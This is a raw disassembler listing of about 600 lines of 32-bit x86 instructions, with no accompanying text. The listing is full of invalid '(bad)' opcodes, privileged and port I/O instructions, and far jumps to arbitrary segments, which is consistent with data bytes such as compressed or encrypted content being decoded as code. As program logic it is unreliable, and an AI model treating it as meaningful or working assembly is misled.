  40fd73:	fs pop ebp
  40fd75:	inc    ebp
  40fd76:	mov    edi,0x1bb7a78d
  40fd7b:	dec    edx
  40fd7c:	push   ebx
  40fd7d:	xor    al,0x5f
  40fd7f:	fisttp DWORD PTR [edi+0xf]
  40fd82:	pop    ecx
  40fd83:	and    BYTE PTR [ecx-0x21e23afe],al
  40fd89:	push   cs
  40fd8a:	sahf   
  40fd8b:	xchg   esi,eax
  40fd8c:	rcr    BYTE PTR [ebp+0x2b],1
  40fd8f:	jno    0x40fd8b
  40fd91:	push   es
  40fd92:	jb     0x40fd59
  40fd94:	ret    
  40fd95:	stc    
  40fd96:	test   eax,ebx
  40fd98:	psllq  mm0,mm6
  40fd9b:	mul    DWORD PTR [ebp+esi*4+0x4c5fcf69]
  40fda2:	(bad)  
  40fda3:	jg     0x40fddc
  40fda5:	mov    ecx,0xe3fff5ee
  40fdaa:	xor    BYTE PTR [ebp+0x37c8cdd1],bh
  40fdb0:	ins    DWORD PTR es:[edi],dx
  40fdb1:	retf   
  40fdb2:	daa    
  40fdb3:	loop   0x40fd5c
  40fdb5:	ficom  WORD PTR [ecx+0x7785939b]
  40fdbb:	(bad)  
  40fdbc:	shl    BYTE PTR ds:0x40ecf2b,cl
  40fdc2:	cmp    eax,eax
  40fdc4:	jp     0x40fd59
  40fdc6:	jbe    0x40fdc3
  40fdc8:	adc    ebp,DWORD PTR [ebp+eiz*8+0x463075ed]
  40fdcf:	xor    al,bl
  40fdd1:	cmp    ebp,DWORD PTR [edx]
  40fdd3:	(bad)  
  40fdd4:	xor    eax,0x5d713f9
  40fdd9:	and    eax,0xd2319443
  40fdde:	icebp  
  40fddf:	int    0x8f
  40fde1:	cmp    bl,BYTE PTR [ecx+0x62680347]
  40fde7:	inc    edx
  40fde8:	add    al,0xed
  40fdea:	fucomi st,st(1)
  40fdec:	test   bh,dh
  40fdee:	and    DWORD PTR [eax],ecx
  40fdf0:	mov    gs,WORD PTR [ebx]
  40fdf2:	sbb    dl,0x37
  40fdf5:	jg     0x40fd8b
  40fdf7:	loopne 0x40fe72
  40fdf9:	fisub  DWORD PTR [esi*2+0x52eb8059]
  40fe00:	mov    ch,0xce
  40fe02:	or     eax,0x7d44ab4e
  40fe08:	fisttp QWORD PTR [edx+0x517d7d5f]
  40fe0e:	loope  0x40fe84
  40fe10:	scas   al,BYTE PTR es:[edi]
  40fe11:	ror    BYTE PTR [esi+0x71e9526e],1
  40fe17:	inc    ebx
  40fe18:	std    
  40fe19:	dec    esp
  40fe1a:	pop    esi
  40fe1b:	push   edi
  40fe1c:	cmp    DWORD PTR [ebx],eax
  40fe1e:	mov    ebp,0x9cef3a2a
  40fe23:	adc    dl,BYTE PTR [eiz*8+0x7676691c]
  40fe2a:	dec    eax
  40fe2b:	je     0x40fe43
  40fe2d:	fst    QWORD PTR [ecx]
  40fe2f:	lock je 0x40fdf8
  40fe32:	mov    DWORD PTR ds:0x4ffdc76c,ebp
  40fe38:	or     BYTE PTR ds:0xc5051c01,0x4c
  40fe3f:	jmp    0x40fe77
  40fe41:	andps  xmm6,XMMWORD PTR [ecx]
  40fe44:	stos   DWORD PTR es:[edi],eax
  40fe45:	add    al,0x65
  40fe47:	sbb    DWORD PTR [edx-0x25918edc],0x2f03535e
  40fe51:	cmp    al,0x42
  40fe53:	jno    0x40fec0
  40fe55:	fimul  WORD PTR [edx]
  40fe57:	scas   al,BYTE PTR es:[edi]
  40fe58:	popaw  
  40fe5a:	jl     0x40fe29
  40fe5c:	cmp    DWORD PTR [eax-0x13],ebx
  40fe5f:	or     al,0x54
  40fe61:	les    ebx,FWORD PTR [edx+0x48d272d4]
  40fe67:	scas   eax,DWORD PTR es:[edi]
  40fe68:	call   0x6faf59bb
  40fe6d:	imul   BYTE PTR [esi-0x20]
  40fe70:	outs   dx,BYTE PTR ds:[esi]
  40fe71:	jo     0x40fe86
  40fe73:	(bad)  
  40fe75:	(bad)  
  40fe77:	rcl    BYTE PTR [edx+eiz*8+0x7d298712],1
  40fe7e:	js     0x40feb5
  40fe80:	mov    dl,0x4
  40fe82:	push   esp
  40fe83:	retf   0x90e4
  40fe86:	push   eax
  40fe87:	lea    eax,[edi]
  40fe89:	shl    BYTE PTR [esi+0x66],1
  40fe8c:	cld    
  40fe8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe8e:	mov    ebp,0x9625319b
  40fe93:	or     DWORD PTR [edi+0x3f1d3a67],esi
  40fe99:	nop
  40fe9a:	(bad)  
  40fe9b:	jo     0x40fe96
  40fe9d:	test   BYTE PTR [esp+ebx*1-0x3eeb0d30],0xc3
  40fea5:	inc    ecx
  40fea6:	mov    esp,0x97713c5e
  40feab:	mov    ch,0xfa
  40fead:	xor    al,0x31
  40feaf:	dec    esi
  40feb0:	addr16 inc esi
  40feb2:	adc    dh,BYTE PTR [edx]
  40feb4:	in     al,0x4a
  40feb6:	push   0xffffffc1
  40feb8:	ss inc eax
  40feba:	xor    DWORD PTR [ebp+0x3b],0xa8917731
  40fec1:	push   ebp
  40fec2:	dec    edi
  40fec3:	adc    BYTE PTR [ebx-0x33],bh
  40fec6:	jno    0x40fe86
  40fec8:	cmp    BYTE PTR [eax+0x3c794b68],dh
  40fece:	and    eax,0x7972d5bb
  40fed3:	or     al,0xb
  40fed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fed6:	dec    ebp
  40fed7:	popa   
  40fed8:	outs   dx,DWORD PTR ds:[esi]
  40fed9:	push   ds
  40feda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fedb:	sbb    DWORD PTR [edi+0x57e0dcff],edx
  40fee1:	stc    
  40fee2:	mov    DWORD PTR [esi+0x5dc05730],eax
  40fee8:	mov    ecx,0x3efa6b57
  40feed:	xlat   BYTE PTR ds:[ebx]
  40feee:	sti    
  40feef:	into   
  40fef0:	cmp    ecx,ecx
  40fef2:	or     edx,ebx
  40fef4:	xor    BYTE PTR [ecx*8+0x4a049e01],0xbd
  40fefc:	ja     0x40feed
  40fefe:	lods   eax,DWORD PTR ds:[esi]
  40feff:	gs call 0xc4d4e904
  40ff05:	daa    
  40ff06:	sbb    eax,DWORD PTR [edi+0xc]
  40ff09:	add    al,0xa5
  40ff0b:	icebp  
  40ff0c:	sar    BYTE PTR [edx],cl
  40ff0e:	pop    ss
  40ff0f:	adc    ebx,DWORD PTR [ecx+0x36046a87]
  40ff15:	sbb    al,0x29
  40ff17:	outs   dx,DWORD PTR ds:[esi]
  40ff18:	cmp    eax,0xe61660af
  40ff1d:	pop    ebx
  40ff1e:	(bad)
  40ff22:	sub    DWORD PTR [esi-0x1f],ebp
  40ff25:	dec    edx
  40ff26:	daa    
  40ff27:	icebp  
  40ff28:	jmp    0x616:0xebcfabcb
  40ff2f:	mov    dh,0xc2
  40ff31:	lods   eax,DWORD PTR ds:[esi]
  40ff32:	loope  0x40ff6a
  40ff34:	jmp    0x699d:0xe58aeb56
  40ff3b:	mov    dl,0xfb
  40ff3d:	xor    eax,0xde271555
  40ff42:	xor    eax,0x4a63082d
  40ff47:	xor    eax,0xe3d8a278
  40ff4c:	inc    esi
  40ff4d:	loope  0x40ff66
  40ff4f:	jbe    0x40feff
  40ff51:	jp     0x40fed6
  40ff53:	lds    ecx,FWORD PTR [eax]
  40ff55:	cmp    al,0x50
  40ff57:	push   ds
  40ff58:	cmp    bl,BYTE PTR [esi+ebx*1+0x6c]
  40ff5c:	push   ss
  40ff5d:	push   edi
  40ff5e:	repz int 0x65
  40ff61:	sbb    DWORD PTR [ebx-0x6ecc2fa7],ebx
  40ff67:	push   0xffffffa6
  40ff69:	xor    DWORD PTR [ebx],edx
  40ff6b:	xchg   esp,eax
  40ff6c:	sbb    ebp,DWORD PTR [edx+edi*4]
  40ff6f:	fdiv   st(3),st
  40ff71:	mov    cl,0x13
  40ff73:	shl    DWORD PTR ds:0x1f4d5916,1
  40ff79:	daa    
  40ff7a:	in     eax,0x55
  40ff7c:	ss dec edx
  40ff7e:	sbb    DWORD PTR [ecx-0x7c],ebp
  40ff81:	mov    cl,BYTE PTR [ecx+0x7d]
  40ff84:	mov    cl,0x30
  40ff86:	push   ebx
  40ff87:	xchg   esp,eax
  40ff88:	aad    0xed
  40ff8a:	jge    0x410009
  40ff8c:	pop    esi
  40ff8d:	std    
  40ff8e:	fst    DWORD PTR [eax+0xe349c2b]
  40ff94:	sbb    BYTE PTR [ebp+0x62bf1eae],bl
  40ff9a:	int3   
  40ff9b:	rol    cl,cl
  40ff9d:	imul   BYTE PTR [esi-0x3d1c7e10]
  40ffa3:	adc    BYTE PTR fs:[esp+edi*8],bl
  40ffa7:	test   al,0x6d
  40ffa9:	inc    ecx
  40ffaa:	adc    ebx,DWORD PTR [esi]
  40ffac:	dec    BYTE PTR [edi-0x660d8fee]
  40ffb2:	or     al,0x45
  40ffb4:	push   eax
  40ffb5:	mov    al,BYTE PTR [esi]
  40ffb7:	outs   dx,DWORD PTR ds:[esi]
  40ffb8:	test   eax,0x749f519b
  40ffbd:	ss pop esp
  40ffbf:	and    dl,BYTE PTR [edx+0x1ba447ba]
  40ffc5:	rol    BYTE PTR [esi-0x1],1
  40ffc8:	int    0xca
  40ffca:	mov    ah,0x81
  40ffcc:	stos   DWORD PTR es:[edi],eax
  40ffcd:	(bad)  
  40ffce:	(bad)  
  40ffd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffd1:	push   cs
  40ffd2:	pushf  
  40ffd3:	and    eax,0x420f4995
  40ffd8:	xchg   esi,eax
  40ffd9:	or     BYTE PTR [ecx+0x57],ch
  40ffdc:	outs   dx,DWORD PTR ds:[esi]
  40ffdd:	mov    ebx,0xcc24e9a6
  40ffe2:	gs loope 0x40ff99
  40ffe5:	test   al,0x76
  40ffe7:	data16 sti 
  40ffe9:	repz inc ecx
  40ffeb:	xor    al,0x68
  40ffed:	ret    0x16ba
  40fff0:	mov    bl,0x10
  40fff2:	imul   eax,esi,0xffffff92
  40fff5:	cmp    bh,dh
  40fff7:	push   edx
  40fff8:	(bad)  
  40fff9:	mov    ebp,0x27ba93dd
  40fffe:	pop    edx
  40ffff:	push   edx
  410000:	dec    ebp
  410001:	mov    cl,ah
  410003:	gs (bad) 
  410005:	jo     0x40ffc5
  410007:	push   ss
  410008:	imul   DWORD PTR [ebx-0x61]
  41000b:	ins    DWORD PTR es:[edi],dx
  41000c:	adc    cl,BYTE PTR [esi]
  41000e:	pushf  
  41000f:	outs   dx,BYTE PTR ds:[esi]
  410010:	mov    dl,0xd0
  410012:	push   edx
  410013:	hlt    
  410014:	std    
  410015:	inc    eax
  410016:	les    esi,FWORD PTR [ebp+0x446b616a]
  41001c:	xchg   DWORD PTR [ebp+edi*1+0x68dd987d],edx
  410023:	outs   dx,DWORD PTR ds:[esi]
  410024:	sub    ah,0xc1
  410027:	dec    edi
  410028:	mov    ch,0xd8
  41002a:	lahf   
  41002b:	xor    eax,ebp
  41002d:	pop    esi
  41002e:	int3   
  41002f:	mov    ah,0xcb
  410031:	dec    esi
  410032:	int    0x3c
  410034:	cmp    ecx,DWORD PTR [ecx+0x72e4c251]
  41003a:	ret    0x5b87
  41003d:	(bad)  
  41003e:	mov    eax,0x7745476c
  410043:	les    edi,FWORD PTR [esi+0x1496417a]
  410049:	test   ebp,ebx
  41004b:	mov    edi,0x83988a83
  410050:	mov    al,0x26
  410052:	loope  0x41009e
  410054:	inc    ecx
  410055:	jne    0x41002b
  410057:	jge    0x41002f
  410059:	test   eax,0x2de61d27
  41005e:	mov    al,0x75
  410060:	iret   
  410061:	fwait
  410062:	or     eax,0x1f5d4ca3
  410067:	push   ss
  410068:	mov    fs,WORD PTR [edi]
  41006a:	lods   eax,DWORD PTR ds:[esi]
  41006b:	lea    edx,[ecx-0x7]
  41006e:	mov    dl,0xff
  410070:	mov    al,0xdf
  410072:	sbb    al,0x5f
  410074:	rcl    DWORD PTR [ebx-0x1],1
  410077:	scas   eax,DWORD PTR es:[edi]
  410078:	jmp    0x4100d2
  41007a:	ret    
  41007b:	xchg   edx,eax
  41007c:	(bad)  
  41007d:	stos   BYTE PTR es:[edi],al
  41007e:	and    ah,BYTE PTR [ebp-0x22]
  410081:	fucomi st,st(1)
  410083:	or     bh,BYTE PTR [ebx+0x69]
  410086:	jno    0x4100d7
  410088:	jmp    0x4401a634
  41008d:	mov    ecx,0x1d2dace6
  410092:	pop    ecx
  410093:	gs xchg ecx,eax
  410095:	aam    0x2e
  410097:	adc    eax,0x4715bf7e
  41009c:	cmp    dl,bl
  41009e:	lods   al,BYTE PTR ds:[esi]
  41009f:	in     eax,dx
  4100a0:	in     al,dx
  4100a1:	sub    BYTE PTR [esi+eiz*2],0x4
  4100a5:	mov    esi,0x2d0035ec
  4100aa:	sbb    BYTE PTR [esi+ebx*1],dh
  4100ad:	ret    0xe3e7
  4100b0:	(bad)  
  4100b1:	gs loop 0x41007c
  4100b4:	repnz sub al,BYTE PTR [esi+eiz*8-0x3f]
  4100b9:	or     cl,ah
  4100bb:	adc    al,0x50
  4100bd:	out    0xd3,eax
  4100bf:	add    al,0x6e
  4100c1:	xchg   ecx,eax
  4100c2:	fldenv [edx+0x2e]
  4100c5:	test   BYTE PTR [eax],bh
  4100c7:	sub    ebp,DWORD PTR [ebp-0x44b0a82e]
  4100cd:	mov    eax,ds:0xe32208a9
  4100d2:	in     al,dx
  4100d3:	pop    ecx
  4100d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100d5:	sub    ebx,DWORD PTR [edi]
  4100d7:	out    0xe2,al
  4100d9:	lods   al,BYTE PTR ds:[esi]
  4100da:	pop    ss
  4100db:	pop    eax
  4100dc:	leave  
  4100dd:	jge    0x4100e8
  4100df:	dec    ebx
  4100e0:	jle    0x41006f
  4100e2:	jp     0x41009c
  4100e4:	xor    cl,ah
  4100e6:	leave  
  4100e7:	xchg   edx,eax
  4100e8:	sbb    ah,BYTE PTR es:[esi+0x5288c160]
  4100ef:	ror    DWORD PTR [edi],1
  4100f1:	aam    0x71
  4100f3:	push   ds
  4100f4:	xchg   esi,eax
  4100f5:	(bad)  
  4100f6:	push   0x918342e1
  4100fb:	cmp    eax,edx
  4100fd:	xor    BYTE PTR [eax-0x48],bl
  410100:	dec    edx
  410101:	call   0x9cd:0xfab99e41
  410108:	das    
  410109:	sbb    esi,DWORD PTR [edx+0x41af2f9f]
  41010f:	dec    ecx
  410110:	or     eax,DWORD PTR [eax]
  410112:	sbb    eax,DWORD PTR [edi+0x59f399d4]
  410118:	test   al,0x93
  41011a:	mov    dl,0x3c
  41011c:	xlat   BYTE PTR ds:[ebx]
  41011d:	jns    0x4100fa
  41011f:	ss jp  0x41016e
  410122:	add    cl,BYTE PTR ds:0xa2d1a564
  410128:	ret    
  410129:	xor    al,0x20
  41012b:	mov    ah,0x8d
  41012d:	and    DWORD PTR [ebx],edi
  41012f:	in     al,0x49
  410131:	sbb    BYTE PTR [ebx],ah
  410133:	jae    0x410152
  410135:	in     eax,dx
  410136:	(bad)  
  410137:	cs or  ebp,esi
  41013a:	push   0xffffffb0
  41013c:	jo     0x41019c
  41013e:	dec    esi
  41013f:	test   DWORD PTR [ebx-0x4e6334fd],ebx
  410145:	and    al,0xf0
  410147:	sub    eax,0x858e95ea
  41014c:	popa   
  41014d:	ja     0x4100e7
  41014f:	test   eax,0x2de3ac87
  410154:	mov    ds:0x8debe6a4,al
  410159:	push   0xffffffe8
  41015b:	pop    ds
  41015c:	jge    0x4101c3
  41015e:	test   BYTE PTR [edi-0x4e],0x7e
  410162:	js     0x410136
  410164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410165:	or     edi,DWORD PTR [si]
  410168:	add    ah,al
  41016a:	or     al,0x2f
  41016c:	mov    eax,0x77786dec
  410171:	dec    edi
  410172:	jno    0x41018c
  410174:	pop    ebx
  410175:	jge    0x410173
  410177:	dec    ebp
  410178:	jne    0x41015c
  41017a:	test   eax,0xee2bfff4
  41017f:	cld    
  410180:	aaa    
  410181:	aaa    
  410182:	lods   al,BYTE PTR ds:[esi]
  410183:	sub    al,BYTE PTR [esi+edi*2+0x3c314d5d]
  41018a:	jb     0x4101c1
  41018c:	int    0x97
  41018e:	mov    al,ds:0x3cc36f6
  410193:	stc    
  410194:	jo     0x4101e3
  410196:	outs   dx,BYTE PTR ds:[esi]
  410197:	ja     0x4101d3
  410199:	sbb    eax,0x929aaa98
  41019e:	mov    cs,WORD PTR [ebx]
  4101a0:	mov    esp,ecx
  4101a2:	vmwrite ecx,esp
  4101a5:	fidiv  DWORD PTR [ecx+ebx*1]
  4101a8:	xor    edi,ebx
  4101aa:	mov    al,ds:0x4f598fad
  4101af:	pushf  
  4101b0:	loopne 0x410225
  4101b2:	jle    0x410149
  4101b4:	mov    al,ds:0xd11cf52f
  4101b9:	xchg   bx,ax
  4101bb:	repnz (bad) [esi-0x57d86666]
  4101c2:	pop    eax
  4101c3:	mov    ecx,0xd4ef501f
  4101c8:	add    BYTE PTR [edx],0x70
  4101cb:	jne    0x4101bf
  4101cd:	aad    0x18
  4101cf:	xor    al,0x5f
  4101d1:	sub    BYTE PTR [edi+0x106ab38d],bh
  4101d7:	scas   al,BYTE PTR es:[edi]
  4101d8:	int    0x40
  4101da:	pop    ds
  4101db:	leave  
  4101dc:	fbstp  TBYTE PTR [edx]
  4101de:	xchg   edx,eax
  4101df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e0:	in     eax,0x7f
  4101e2:	stc    
  4101e3:	inc    edi
  4101e4:	sbb    DWORD PTR [edx],ebx
  4101e6:	mov    dh,0xf6
  4101e8:	retf   
  4101e9:	dec    ecx
  4101ea:	adc    eax,0x68e5d828
  4101ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101f0:	add    DWORD PTR [edi-0x27],ebx
  4101f3:	call   0xf14:0x39055126
  4101fa:	lea    ecx,[edi]
  4101fc:	jg     0x4101e9
  4101fe:	inc    DWORD PTR [ebp+0x42]
  410201:	test   bl,0xcf
  410204:	xlat   BYTE PTR ds:[ebx]
  410205:	aaa    
  410206:	add    BYTE PTR [eax],al
  410208:	scas   al,BYTE PTR es:[edi]
  410209:	fdivr  DWORD PTR cs:[edx+0x50e463e0]
  410210:	inc    BYTE PTR [esi]
  410212:	ins    DWORD PTR es:[edi],dx
  410213:	push   es
  410214:	fptan  
  410216:	push   0xf13aa891
  41021b:	cmc    
  41021c:	jge    0x410282
  41021e:	and    DWORD PTR [esi-0x5d],ecx
  410221:	test   BYTE PTR [ebx+0x7bfd87ec],0x8
  410228:	inc    edi
  410229:	std    
  41022a:	add    eax,0xf03fffd8
  41022f:	push   edi
  410230:	stc    
  410231:	xchg   ecx,eax
  410232:	(bad)  
  410233:	jle    0x410210
  410235:	call   0x2ab7075b
  41023a:	cmc    
  41023b:	mov    cl,0xe5
  41023d:	call   FWORD PTR [edx-0x63c5cbf4]
  410243:	lods   eax,DWORD PTR ds:[esi]
  410244:	out    dx,eax
  410245:	in     eax,0x45
  410247:	pushf  
  410248:	pop    es
  410249:	mov    cl,0xfd
  41024b:	mov    cl,BYTE PTR [esi+0x6639a18d]
  410251:	push   eax
  410252:	call   0x65b6d7ee
  410257:	adc    eax,0xd2dc3b9d
  41025c:	ficom  DWORD PTR [ecx+0x418c7554]
  410262:	dec    edi
  410263:	and    edi,0x14
  410266:	mov    edi,0xf6a5d041
  41026b:	xlat   BYTE PTR ds:[ebx]
  41026c:	xor    BYTE PTR es:[edx+0x3380943b],al
  410273:	pushf  
  410274:	pop    ecx
  410275:	lea    ebp,[ebx-0x1993174f]
  41027b:	jno    0x410209
  41027d:	lods   al,BYTE PTR ds:[esi]
  41027e:	xor    esp,ebp
  410280:	sub    eax,0x410537b9
  410285:	loop   0x410268
  410287:	(bad)  
  410288:	cmp    dl,BYTE PTR [ecx]
  41028a:	(bad)  
  41028b:	int3   
  41028c:	mov    ebx,0x2a216487
  410291:	mov    ah,0x0
  410293:	and    ebp,DWORD PTR [esp+ebp*1]
  410296:	sar    BYTE PTR [esi],1
  410298:	jmp    0x94fa:0x4a0eb83a
  41029f:	or     dh,BYTE PTR [edi-0x79ffa0b0]
  4102a5:	pop    ebp
  4102a6:	push   eax
  4102a7:	pop    ecx
  4102a8:	push   ebx
  4102a9:	sub    DWORD PTR [ecx],esi
  4102ab:	and    esp,DWORD PTR [edi-0x64f1ec12]
  4102b1:	inc    edx
  4102b2:	push   ebp
  4102b3:	push   ebx
  4102b4:	mov    dl,0xc6
  4102b6:	adc    al,0xf9
  4102b8:	int    0x33
  4102ba:	and    bh,BYTE PTR [eax]
  4102bc:	jmp    0xc61d:0xe3e3ef00
  4102c3:	fistp  QWORD PTR [esi]
  4102c5:	mov    edx,0x5e70398
  4102ca:	loope  0x41028a
  4102cc:	jmp    0xa0f4:0x8d7d452f
  4102d3:	jno    0x410284
  4102d5:	and    al,0xe8
  4102d7:	xor    DWORD PTR [eax-0xb6e1133],0xe6cee6d5
  4102e1:	(bad)  
  4102e2:	cdq    
  4102e3:	xor    eax,0xb13e9542
  4102e8:	or     BYTE PTR [esi-0x27],bh
  4102eb:	xor    eax,0x864d61d5
  4102f0:	xchg   esi,eax
  4102f1:	mov    es,ebp
  4102f3:	xor    BYTE PTR [ecx+0x7df5e2e3],0xcc
  4102fa:	or     eax,0x2f98840a
  4102ff:	sahf   
  410300:	fiadd  WORD PTR [edi+0x1b8f5ded]
  410306:	mov    esi,0x98f4104c
  41030b:	sbb    esi,DWORD PTR [ebx]
  41030d:	push   ecx
  41030e:	pop    ss
  41030f:	int    0xf6
  410311:	dec    esi
  410312:	sar    BYTE PTR [ebx+0x64dfebf2],cl
  410318:	loope  0x4102e8
  41031a:	xchg   ebp,eax
  41031b:	cmp    al,0xab
  41031d:	lds    eax,FWORD PTR gs:[edx-0x78]
  410321:	ja     0x410372
  410323:	cli    
  410324:	sub    al,0x1f
  410326:	neg    BYTE PTR [edi-0x32e9d9ec]
  41032c:	imul   esp,DWORD PTR [ebx+0x50]
  410330:	fwait
  410331:	hlt    
  410332:	scas   al,BYTE PTR es:[edi]
  410333:	pop    ebx
  410334:	pop    eax
  410335:	mov    bh,0xf
  410337:	and    al,bh
  410339:	test   ebp,ecx
  41033b:	ror    BYTE PTR [edx],0x9
  41033e:	or     DWORD PTR [eax+0x7b],esp
  410341:	or     dh,al
  410343:	xchg   ecx,eax
  410344:	add    esi,eax
  410346:	addr16 mov eax,0x87a08df0
  41034c:	imul   ecx,DWORD PTR [edx-0x349ab118],0xffffff8a
  410353:	or     bl,BYTE PTR [esi+edx*2-0x3b]
  410357:	test   al,0x36
  410359:	pop    edi
  41035a:	jp     0x410384
  41035c:	push   0x6e1fcfc4
  410361:	pop    eax
  410362:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  410364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410365:	adc    edi,edi
  410367:	adc    eax,0x7076ba9a
  41036c:	mov    esp,0x251391a4
  410371:	inc    ebx
  410372:	aad    0x56
  410374:	and    DWORD PTR [ebx],edi
  410376:	push   ecx
  410377:	jg     0x4103e6
  410379:	xchg   edi,eax
  41037a:	sti    
  41037b:	idiv   DWORD PTR [esi]
  41037d:	je     0x410362
  41037f:	xor    BYTE PTR [edx-0x4f],al
  410382:	push   es
  410383:	aam    0x50
  410385:	lahf   
  410386:	mov    bl,0x22
  410388:	xchg   ebx,eax
  410389:	das    
  41038a:	xlat   BYTE PTR ds:[ebx]
  41038b:	das    
  41038c:	mov    WORD PTR ds:[eax-0x77],fs
  410390:	scas   eax,DWORD PTR es:[edi]
  410391:	add    esp,ebp
  410393:	out    dx,al
  410394:	mov    ah,0x58
  410396:	xor    BYTE PTR ds:0x783c13f4,bh
  41039c:	popf   
  41039d:	push   ss
  41039e:	xor    ah,ah
  4103a0:	fst    QWORD PTR [ebp+0x5105ecfa]
  4103a6:	(bad)  
  4103a8:	mov    edi,0xd5d58f5e
  4103ad:	test   DWORD PTR [ecx+0x2],eax
  4103b0:	iret   
  4103b1:	sahf   
  4103b2:	int    0xc9
  4103b4:	ficom  DWORD PTR [edi+esi*4+0x58a9b6fc]
  4103bb:	fmul   st(1),st
  4103bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103be:	push   ebx
  4103bf:	dec    ebx
  4103c0:	(bad)  
  4103c2:	call   0x2a295ed8
  4103c7:	mov    ebp,0x849f6b66
  4103cc:	and    bh,BYTE PTR [edx+eax*8+0x682c9f73]
  4103d3:	sub    eax,0x6b75ea6
  4103d8:	add    al,0x46
  4103db:	loop   0x410411
  4103dd:	nop
  4103de:	xchg   BYTE PTR [edx],al
  4103e0:	sub    al,0x7c
  4103e2:	dec    edx
  4103e3:	cmp    eax,DWORD PTR [eax+eiz*1-0x50]
  4103e7:	ins    BYTE PTR es:[edi],dx
  4103e8:	out    dx,al
  4103e9:	daa    
  4103ea:	ins    DWORD PTR es:[edi],dx
  4103eb:	jno    0x4103de
  4103ed:	inc    eax
  4103ee:	mov    esi,fs
  4103f0:	cwde   
  4103f1:	xchg   esp,eax
  4103f2:	es leave 
  4103f4:	xchg   ecx,eax
  4103f5:	stc    
  4103f6:	rol    BYTE PTR [ecx+0x2d],cl
  4103f9:	sub    DWORD PTR ds:0xb8c8a0a3,ecx
  4103ff:	call   0xeb28:0xeb76ee98
  410406:	aam    0x9
  410408:	sub    cl,BYTE PTR [ecx]
  41040a:	jecxz  0x410404
  41040c:	arpl   WORD PTR [ebp-0x70],cx
  41040f:	add    edx,DWORD PTR [edi-0x42419f4a]
  410415:	adc    eax,0xd406ff7b
  41041a:	pop    es
  41041b:	mov    esp,0xe8126952
  410420:	stos   BYTE PTR es:[edi],al
  410421:	add    edx,DWORD PTR [ecx-0x6cab828a]
  410427:	or     edx,edi
  410429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41042a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41042b:	inc    esp
  41042c:	cmc    
  41042d:	mov    cl,0x93
  41042f:	pop    ebp
  410430:	(bad)  
  410431:	enter  0xa183,0xf0
  410435:	cs sub al,0x19
  410438:	pop    es
  410439:	mov    ds,ecx
  41043b:	dec    edi
  41043c:	popa   
  41043d:	sbb    esp,DWORD PTR [ecx]
  41043f:	mov    gs,WORD PTR [edx-0x76]
  410442:	(bad)  
  410443:	test   al,0xe4
  410445:	and    eax,ebp
  410447:	jne    0x4104c1
  410449:	dec    esp
  41044a:	dec    edi
  41044b:	fsub   QWORD PTR [ebx-0x2c]
  41044e:	pop    ebx
  41044f:	ficomp DWORD PTR fs:[ebp-0x5e]
  410453:	mov    ah,0x93
  410455:	inc    ebx
  410456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410457:	outs   dx,BYTE PTR ds:[esi]
  410458:	xor    al,BYTE PTR [eax-0x30]
  41045b:	sub    edi,ebp
  41045d:	es ins BYTE PTR es:[edi],dx
  41045f:	jae    0x4104cc
  410461:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410463:	jg     0x410442
  410465:	xchg   esi,eax
  410466:	ret    
  410467:	int    0xb7
  410469:	push   ss
  41046a:	pop    ebp
  41046b:	imul   ecx,DWORD PTR [ebp+0x1e1a245a],0x9
  410472:	jbe    0x41041b
  410474:	or     DWORD PTR [edx+edx*1+0xe],edi
  410478:	shl    BYTE PTR [ecx+ebx*1-0x2b],0x3c
  41047d:	or     ebx,edi
  41047f:	mov    ah,0x4f
  410481:	pop    ecx
  410482:	pop    eax
  410483:	sub    cl,bh
  410485:	sub    al,0xf9
  410487:	(bad)  [ebx-0x43ef7281]
  41048d:	jle    0x410490
  41048f:	dec    esi
  410490:	mov    ds:0xfbebf6e5,al
  410495:	sahf   
  410496:	outs   dx,BYTE PTR ds:[esi]
  410497:	jle    0x410483
  410499:	mov    WORD PTR ds:0x3878aa0f,fs
  41049f:	out    0xbe,al
  4104a1:	jmp    edi
  4104a3:	mov    WORD PTR [ecx],fs
  4104a5:	mov    al,0x5a
  4104a7:	xchg   edi,eax
  4104a8:	add    cl,cl
  4104aa:	mov    ebx,0x296fee6f
  4104af:	xor    eax,0xdea982b8
  4104b4:	rol    ebx,cl
  4104b6:	dec    edi
  4104b7:	xchg   ebx,eax
  4104b8:	xor    al,0xcf
  4104ba:	gs mov al,0xa9
  4104bd:	mov    BYTE PTR [ecx],dl
  4104bf:	mov    eax,0xdd481fb4
  4104c4:	dec    ebx
  4104c5:	xor    esp,eax
  4104c7:	xor    eax,0xcc07708
  4104cc:	pop    ecx
  4104cd:	mov    al,ds:0xebbd084c
  4104d2:	and    eax,esi
  4104d4:	dec    esi
  4104d5:	and    ch,BYTE PTR [ebx+edx*1-0x55]
  4104d9:	mov    ah,0x22
  4104db:	push   edi
  4104dc:	aam    0xa0
  4104de:	rcl    DWORD PTR [edx+ebx*1-0x50dace5],cl
  4104e5:	retf   
  4104e6:	iret   
  4104e7:	pop    ss
  4104e8:	xchg   esp,eax
  4104e9:	mov    ds:0x86bc9341,eax
  4104ee:	and    eax,0x898b674b
  4104f3:	shr    DWORD PTR [ebp-0x2f],0xa4
  4104f7:	ja     0x4104b2
  4104f9:	int3   
  4104fa:	jne    0x41053a
  4104fc:	ss mov ebp,0x620c211
  410502:	loop   0x4104fe
  410504:	lock fisubr DWORD PTR [edx+0x39]
  410508:	mov    al,ds:0x2f722590
  41050d:	popa   
  41050e:	push   es
  41050f:	imul   edx,DWORD PTR [ecx-0x480a92b0],0x4ccfe0e7
  410519:	fwait
  41051a:	mov    bl,0x9d
  41051c:	mov    edi,0xbff3048a
  410521:	in     eax,dx
  410522:	into   
  410523:	push   ecx
  410524:	stc    
